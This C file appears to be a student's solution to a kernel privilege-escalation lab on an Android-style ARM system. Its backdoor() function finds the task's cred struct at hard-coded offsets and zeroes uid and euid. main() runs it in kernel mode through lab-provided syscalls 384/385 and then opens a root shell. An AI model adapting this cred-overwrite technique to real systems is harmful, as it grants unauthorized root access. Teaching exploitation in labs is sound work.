#include <stdio.h>
#include <unistd.h>

#include <assert.h>

//#include <asm/thread_info.h>

static inline  int current_thread_info(void) __attribute_const__;

static inline  int current_thread_info(void)
{
	register unsigned long sp asm ("sp");
	return ( int )(sp & ~(8192 - 1));
}
// Backdoor function
// NOTE: This function is supposed to execute in kernel space
// Therefore, you should make NO system calls or the kernel will crash
void backdoor() {
    //syscall(213, 0);
   // void (*func)(int) = 0xc002b100;
    //func(0);
    // First, locate thread info using provided system call. Check kernel source code.
    //get poijter to thread_info
    register unsigned long sp asm ("sp");
    unsigned int th = (unsigned int)((sp & ~(8192 - 1)));
    //fprintf(stderr, "backdoor_thread_info: %p\n", th);
    //th = th & ~(0xf << 32);
    //th = th >> 4;
    //printf("%p\n", th);

    

    //printf("%p", syscall(385, 0, 0));
    //assert(th = syscall(385,4,NULL)); 

    char* thread = (int*)th;
    char* addr_limit = *(int*)(thread + 8);
    //*addr_limit = 0xffffffff;
    char* task = *(int*)(thread + 12);
    char* cred = *((int*)(task + 732));
    //fprintf(stderr, "cred_backdoor: %p\n", cred);
    //cred = *cred;
    //char* uid = *(int*)(cred + 4);
    int* uid = (int*)(cred + 4);
    *uid = 0;
    int* euid = (int*)(cred + 20);
    *euid = 0;
    //*uid = 0;
    //fprintf(stderr, "uid_backdoor: %p\n", uid);
    // Next, you need to find thread_info->task->cred
    //
    // There are three ways to do it:
    // 1.  Read kernel source code and compute the exact offset. 
    //     You will need to look at the .config file under kernel dir to resolve some macros
    // 2.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 3.  Scan from thread_info->task to find the location of cred field
    //     HINT: here are some conditions to help: 
    //         task->cpu_timers[i] >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->cpu_timers[i]->next == task->cpu_timers[i]->prev (Because we never set any cpu timer)
    //         task->cpu_timers[i]->next >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->real_cred == task->cred (Because we never used seteuid() system call)
    //         task->cred->uid == getuid()
    
    // Finally, you will need to rewrite the cred struct and give your process highest privilege
    return;
}

void test() {
    // First, locate thread info using provided system call. Check kernel source code.
    //get poijter to thread_info
    int data = 2;
    char* th1 = syscall(385,4,NULL);
    syscall(385, 0, 0);
    //calculate the offset to addr_limit in thread info
   // int addr_limit = th1 ; //point 

   // syscall(385, 1, data);
   

    //syscall(385, 2, addr_limit);

    data = 1;
    //syscall(385, 1, 1);
    
    //dereference the pointer to thread_info->task to get the pointer to task_struct
    //syscall(385, 0, 0);
    char* task = th1 + 8;

    syscall(385, 1, 2);
    syscall(385, 2, task);
    char* cred = syscall(385, 3, 0);
    syscall(385, 0, 0);

    cred = cred + 728;
    //syscall(385, 1, 2);
    //syscall(385, 2, cred);
    //char* uid = syscall(385, 3, 0);
    //syscall(385, 0, 0);

    const int LIMIT = 257;

    char* uid_write;
    //uid_write = uid + 4 + 0 - 8;
    //fprintf(stderr, "test.\n");
    //fprintf(stderr, "cred_test: %p\n", cred + 4);
    //fprintf(stderr, "uid_test: %p\n", uid + 4);
    // syscall(385, 1, 1);
    // syscall(385, 2, uid_write);
    // syscall(385, 1, 2);
    
   

    //void* task = th1;
    //printf("%d, %d", sizeof(unsigned long), int);
    
    // Next, you need to find thread_info->task->cred
    //
    // There are three ways to do it:
    // 1.  Read kernel source code and compute the exact offset. 
    //     You will need to look at the .config file under kernel dir to resolve some macros
    // 2.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 3.  Scan from thread_info->task to find the location of cred field
    //     HINT: here are some conditions to help: 
    //         task->cpu_timers[i] >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->cpu_timers[i]->next == task->cpu_timers[i]->prev (Because we never set any cpu timer)
    //         task->cpu_timers[i]->next >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->real_cred == task->cred (Because we never used seteuid() system call)
    //         task->cred->uid == getuid()
    
    // Finally, you will need to rewrite the cred struct and give your process highest privilege
    return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());

    //register unsigned long sp asm ("sp");
    //int th1 = (int)(sp & ~(8192 - 1));
    //char* th2 = (char*)current_thread_info();
    char* th3 = (char*)syscall(385,4,NULL);
    //printf("%p\n", th1);
    //printf("%p\n", th2);
    printf("%p\n", th3);
    //test();

    syscall(384,1,NULL);
    syscall(384,2,NULL);
    syscall(384,3,&backdoor);
    syscall(384,2,NULL);
    printf("%p",syscall(384,4,NULL));
    // Run the exploit    
    // You will need to use provided system calls to execute the backdoor() function in kernel mode 


    // If the exploit is successful, getuid() should return zero.
    fprintf(stderr, "getuid() = %d\n", getuid());

    if (getuid() == 0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/system/bin/sh", NULL};
        execv("/system/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
